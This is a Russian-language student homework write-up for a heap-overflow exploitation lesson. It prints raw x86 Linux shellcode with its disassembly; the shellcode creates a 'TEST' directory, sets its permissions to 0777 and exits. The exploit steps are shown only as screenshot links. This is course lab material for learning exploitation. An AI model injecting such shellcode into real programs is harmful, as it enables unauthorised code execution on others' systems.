# Орехов Роман ДЗ № 2
Урок 5. Видеоурок 3 - Переполнение кучи

Разработать эксплойт, который бы содержал шелл-код с полезной нагрузкой для программы prog5 из видео 0х03.02. Обязательно убедиться в работоспособности шелл-кода (шелл-код будет предоставлен).

`$ cat mkdir_shell.str`

`\x31\xc0\x50\x68\x54\x45\x53\x54\xb0\x27\x89\xe3\x66\x41\xcd\x80\xb0\x0f\x66\xb9\xff\x01\xcd\x80\x31\xc0\x40\xcd\x80\xb0\x01\x31\xdb\xcd\x80`


`$ objdump -D -M intel mkdir_shell | grep -A16 "<shellcode>"`

```
0804a040 <shellcode>:
804a040: 31 c0 xor eax,eax
804a042: 50 push eax
804a043: 68 54 45 53 54 push 0x54534554
804a048: b0 27 mov al,0x27
804a04a: 89 e3 mov ebx,esp
804a04c: 66 41 inc cx
804a04e: cd 80 int 0x80
804a050: b0 0f mov al,0xf
804a052: 66 b9 ff 01 mov cx,0x1ff
804a056: cd 80 int 0x80
804a058: 31 c0 xor eax,eax
804a05a: 40 inc eax
804a05b: cd 80 int 0x80
804a05d: b0 01 mov al,0x1
804a05f: 31 db xor ebx,ebx
804a061: cd 80 int 0x80
```
Выполнение:

Переписал с методички текст проги

![изображение](https://github.com/Bravo-47/binary/assets/52736408/ce661979-afda-4d6c-b4de-e3bc2d4d2429)

Скомпилировал

![изображение](https://github.com/Bravo-47/binary/assets/52736408/00bba689-4d03-49f8-8fc7-7f9203de839f)

Запустил без параметров

![изображение](https://github.com/Bravo-47/binary/assets/52736408/dc4271e9-5247-433a-8740-64accd145e9e)

У меня почему-то сломалось приложение

![изображение](https://github.com/Bravo-47/binary/assets/52736408/8549b6f0-6c90-4013-87bb-817aae752674)

Опечатался, пропустил двойные кавычки

![изображение](https://github.com/Bravo-47/binary/assets/52736408/b022ecaf-c3e5-4454-8c2a-5a007b91cfdd)






